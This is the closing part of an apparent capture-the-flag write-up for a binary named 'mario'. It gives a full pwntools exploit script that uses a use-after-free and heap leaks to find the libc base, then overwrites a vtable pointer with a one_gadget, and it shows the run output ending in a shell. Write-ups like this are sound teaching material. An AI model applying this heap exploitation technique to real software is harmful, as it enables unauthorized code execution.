  target.sendline("P")
  print target.recvuntil("yourself: ")
  target.sendline(payload)

def infoLeak():
  print target.recvuntil("Choice: ")
  target.sendline("W")
  print target.recvuntil("to say: ")
  leak = target.recvline()
  leak = leak.replace("\x0a", "")
  leak = u64(leak + "\x00"*(8 - len(leak)))
  print "[+] [+] [+] leak is: " + hex(leak) 
  return leak


# Create the first user
newCustomer("guyinatuxedo")

# Setup the pizza ingredients to have the pineapple ingredient appended together, and pass the free check
pizzas = [[tomato]] +  [["\xe0" + pineapple[:2], pineapple[2:] + "00"]] * 16

# Order the pizzas
orderPizzas(pizzas)

# Cook the pizzas, cause Mario to get upset over pineapple, and cause our explanation to get freed
cookPizzas("0"*200)

# Go back to the first menu to get the infoleak
leave()

# Get the heap infoleak, figure out heap base
heapLeak = infoLeak()
heapBase = heapLeak - 0x130a0

# Make a second customer
newCustomer("15935728")

# Just order a single tomato pizza, setup the free for the explanation
orderPizzas([[tomato]])
cookPizzas("1"*200)

# Get the libc infoleak, 
leave()
libcLeak = infoLeak()
libcBase = libcLeak - 0x3c4b78

# Login as the second user, groom the heap to prep for the heap overflow of vtable function pointer

login("15935728")
orderPizzas([[tomato]])
cookPizzas("1111")
leave()

# Figure out the oneGadget address, and where it will be
oneGadget = libcBase + 0x4526a
oneGadgetPtr = heapLeak - 0xf70

# Form the payload for the heap overflow of vtable function pointer

payload = p64(oneGadget) 
payload += "0"*(0xa0 - len(payload))
payload += p64(oneGadgetPtr) 

# Login as the first user, and send the payload
login("guyinatuxedo")
explainOverflow(payload)

# Login as the second user, and admire the pies to execute our onegadget
login("15935728")
admire()

# Drop to an interactive shell
target.interactive()
```

when we run it:
```
$ python exploit.py 
[+] Starting local process './mario': pid 17615
[*] running in new terminal: /usr/bin/gdb -q  "./mario" 17615 -x "/tmp/pwno51UTr.gdb"
[+] Waiting for debugger: Done
Wellcom my friende!! It's-a me, Mario! Ready for pizza italiana vera?

. . .

Choice: 
[*] Switching to interactive mode
Admire these beauties... (3)
                  ___
                  |  ~~--.
                  |%=@%%/
                  |o%%%/
               __ |%%o/
         _,--~~ | |(_/ ._
      ,/'  m%%%%| |o/ /  `\.
     /' m%%o(_)%| |/ /o%%m `\
   /' %%@=%o%%%o|   /(_)o%%% `\
  /  %o%%%%%=@%%|  /%%o%%@=%%  \
 |  (_)%(_)%%o%%| /%%%=@(_)%%%  |
 | %%o%%%%o%%%(_|/%o%%o%%%%o%%% |
 | %%o%(_)%%%%%o%(_)%%%o%%o%o%% |
 |  (_)%%=@%(_)%o%o%%(_)%o(_)%  |
  \ ~%%o%%%%%o%o%=@%%o%%@%%o%~ /
   \. ~o%%(_)%%%o%(_)%%(_)o~ ,/
     \_ ~o%=@%(_)%o%%(_)%~ _/
       `\_~~o%%%o%%%%%~~_/'
          `--..____,,--'

$ w
 21:31:05 up 13:21,  1 user,  load average: 0.60, 0.28, 0.10
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
guyinatu tty7     :0               Sun17   28:21m  3:33   0.29s /sbin/upstart --user
$ ls
core        libc.so.6  peda-session-mario.txt  solved.py
exploit.py  mario      so.py               solvedPerf.py
```
